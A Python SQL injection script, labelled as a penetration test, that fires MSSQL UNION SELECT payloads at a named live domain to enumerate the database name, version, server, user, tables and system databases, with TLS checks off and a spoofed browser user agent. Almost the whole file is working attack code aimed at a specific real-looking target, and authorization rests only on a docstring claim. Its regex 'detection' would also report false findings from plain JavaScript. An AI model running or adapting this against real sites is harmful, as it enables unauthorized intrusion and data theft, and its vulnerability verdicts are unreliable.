#!/usr/bin/env python3

"""
Specific Database Information Extraction
Extract specific database information with detailed analysis
Team B - Panama8888b Penetration Test
"""

import requests
import time
import urllib.parse
import json
import sys
import warnings
import re

# Disable SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class SpecificDatabaseExtractor:
    def __init__(self):
        self.base_url = "https://member.panama8888b.com/public/js/v2/app.js"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })
        self.session.verify = False
        self.extracted_info = {}
        
    def extract_specific_info(self, payload, description):
        """Extract specific information using SQL injection"""
        print(f"[*] Extracting: {description}")
        
        # Encode payload
        encoded_payload = urllib.parse.quote(payload)
        url = f"{self.base_url}?v={encoded_payload}"
        
        try:
            response = self.session.get(url, timeout=15)
            content = response.text
            
            # Detailed analysis
            info = {
                'status_code': response.status_code,
                'content_length': len(content),
                'extracted_data': {},
                'sql_errors': [],
                'database_indicators': []
            }
            
            # Look for specific database information
            content_lower = content.lower()
            
            # Database name extraction
            if 'db_name()' in payload.lower():
                # Look for database name patterns
                db_patterns = [
                    r'db_name\(\)[^>]*>([^<>\s]+)',
                    r'database[^>]*>([^<>\s]+)',
                    r'current database[^>]*>([^<>\s]+)'
                ]
                
                for pattern in db_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    if matches:
                        info['extracted_data']['database_name'] = matches[0]
                        print(f"[+] Database name found: {matches[0]}")
                        break
            
            # Version extraction
            if '@@version' in payload.lower():
                version_patterns = [
                    r'@@version[^>]*>([^<>\n]+)',
                    r'microsoft sql server[^>]*>([^<>\n]+)',
                    r'sql server[^>]*>([^<>\n]+)'
                ]
                
                for pattern in version_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    if matches:
                        info['extracted_data']['version'] = matches[0]
                        print(f"[+] Version found: {matches[0]}")
                        break
            
            # Server name extraction
            if '@@servername' in payload.lower():
                server_patterns = [
                    r'@@servername[^>]*>([^<>\s]+)',
                    r'server name[^>]*>([^<>\s]+)',
                    r'host name[^>]*>([^<>\s]+)'
                ]
                
                for pattern in server_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    if matches:
                        info['extracted_data']['server_name'] = matches[0]
                        print(f"[+] Server name found: {matches[0]}")
                        break
            
            # User extraction
            if 'user_name()' in payload.lower():
                user_patterns = [
                    r'user_name\(\)[^>]*>([^<>\s]+)',
                    r'current user[^>]*>([^<>\s]+)',
                    r'system user[^>]*>([^<>\s]+)'
                ]
                
                for pattern in user_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    if matches:
                        info['extracted_data']['current_user'] = matches[0]
                        print(f"[+] Current user found: {matches[0]}")
                        break
            
            # Table extraction
            if 'sysobjects' in payload.lower() or 'information_schema' in payload.lower():
                table_patterns = [
                    r'from\s+([a-zA-Z_][a-zA-Z0-9_]*)',
                    r'table\s+([a-zA-Z_][a-zA-Z0-9_]*)',
                    r'into\s+([a-zA-Z_][a-zA-Z0-9_]*)'
                ]
                
                tables_found = []
                for pattern in table_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    if matches:
                        tables_found.extend(matches)
                
                if tables_found:
                    info['extracted_data']['tables'] = list(set(tables_found))
                    print(f"[+] Tables found: {tables_found}")
            
            # Check for SQL errors and indicators
            sql_indicators = [
                'microsoft sql server',
                'database',
                'table',
                'column',
                'sysobjects',
                'information_schema',
                'master',
                'tempdb',
                'model',
                'msdb',
                'sql server',
                'mssql'
            ]
            
            for indicator in sql_indicators:
                if indicator in content_lower:
                    info['database_indicators'].append(indicator)
            
            # Check for error messages
            error_patterns = [
                r'error[^>]*>([^<>\n]+)',
                r'exception[^>]*>([^<>\n]+)',
                r'failed[^>]*>([^<>\n]+)',
                r'syntax[^>]*>([^<>\n]+)'
            ]
            
            for pattern in error_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    info['sql_errors'].extend(matches)
            
            return info
            
        except requests.exceptions.Timeout:
            print("[!] Request timed out - possible successful injection")
            return {'timeout': True, 'description': description}
        except Exception as e:
            print(f"[!] Error: {e}")
            return {'error': str(e), 'description': description}
    
    def run_specific_extraction(self):
        """Run specific database extraction"""
        print("="*60)
        print("Specific Database Information Extraction")
        print("Target: https://member.panama8888b.com/public/js/v2/app.js")
        print("="*60)
        
        # Specific payloads for detailed extraction
        payloads = [
            ("25.1)) UNION SELECT DB_NAME() --", "Database Name"),
            ("25.1)) UNION SELECT @@version --", "Version Information"),
            ("25.1)) UNION SELECT @@servername --", "Server Name"),
            ("25.1)) UNION SELECT USER_NAME() --", "Current User"),
            ("25.1)) UNION SELECT HOST_NAME() --", "Host Name"),
            ("25.1)) UNION SELECT name FROM sysobjects WHERE xtype='U' --", "User Tables"),
            ("25.1)) UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --", "All Tables"),
            ("25.1)) UNION SELECT name FROM master..sysdatabases --", "System Databases"),
        ]
        
        print(f"\n[*] Running specific extraction with {len(payloads)} payloads...")
        
        for payload, description in payloads:
            result = self.extract_specific_info(payload, description)
            self.extracted_info[description] = result
            
            # Quick summary
            if result.get('extracted_data'):
                print(f"[+] Data extracted: {result['extracted_data']}")
            
            if result.get('database_indicators'):
                print(f"[+] Database indicators: {result['database_indicators']}")
            
            time.sleep(1)  # Delay between requests
        
        # Comprehensive summary
        print("\n" + "="*60)
        print("SPECIFIC EXTRACTION SUMMARY")
        print("="*60)
        
        # Collect all extracted information
        all_extracted_data = {}
        all_indicators = []
        all_errors = []
        
        for description, result in self.extracted_info.items():
            if result.get('extracted_data'):
                all_extracted_data.update(result['extracted_data'])
            
            if result.get('database_indicators'):
                all_indicators.extend(result['database_indicators'])
            
            if result.get('sql_errors'):
                all_errors.extend(result['sql_errors'])
        
        # Remove duplicates
        all_indicators = list(set(all_indicators))
        all_errors = list(set(all_errors))
        
        # Display results
        if all_extracted_data:
            print("\n[+] EXTRACTED DATABASE INFORMATION:")
            for key, value in all_extracted_data.items():
                print(f"  {key}: {value}")
        
        if all_indicators:
            print(f"\n[+] DATABASE INDICATORS FOUND:")
            for indicator in all_indicators:
                print(f"  - {indicator}")
        
        if all_errors:
            print(f"\n[+] SQL ERRORS DETECTED:")
            for error in all_errors:
                print(f"  - {error}")
        
        # Final assessment
        if all_extracted_data or all_indicators:
            print("\n[+] SQL INJECTION VULNERABILITY CONFIRMED!")
            print("[+] Database information successfully extracted!")
            print("[+] Target is vulnerable to SQL injection attacks!")
            
            # Specific findings
            if 'database_name' in all_extracted_data:
                print(f"[+] Database Name: {all_extracted_data['database_name']}")
            
            if 'version' in all_extracted_data:
                print(f"[+] Database Version: {all_extracted_data['version']}")
            
            if 'server_name' in all_extracted_data:
                print(f"[+] Server Name: {all_extracted_data['server_name']}")
            
            if 'current_user' in all_extracted_data:
                print(f"[+] Current User: {all_extracted_data['current_user']}")
            
            if 'tables' in all_extracted_data:
                print(f"[+] Tables Found: {all_extracted_data['tables']}")
        else:
            print("\n[!] No specific database information extracted")
            print("[!] Target might be protected or not vulnerable")
        
        return self.extracted_info
    
    def save_results(self, filename="specific_database_extraction_results.json"):
        """Save specific extraction results"""
        with open(filename, 'w') as f:
            json.dump(self.extracted_info, f, indent=2)
        print(f"\n[+] Specific results saved to: {filename}")

def main():
    try:
        extractor = SpecificDatabaseExtractor()
        results = extractor.run_specific_extraction()
        extractor.save_results()
        
        if results:
            print("\n[+] Specific database extraction completed!")
            print("[+] Check the JSON file for detailed results")
        else:
            print("\n[!] No specific database information could be extracted")
        
    except KeyboardInterrupt:
        print("\n[!] Extraction interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()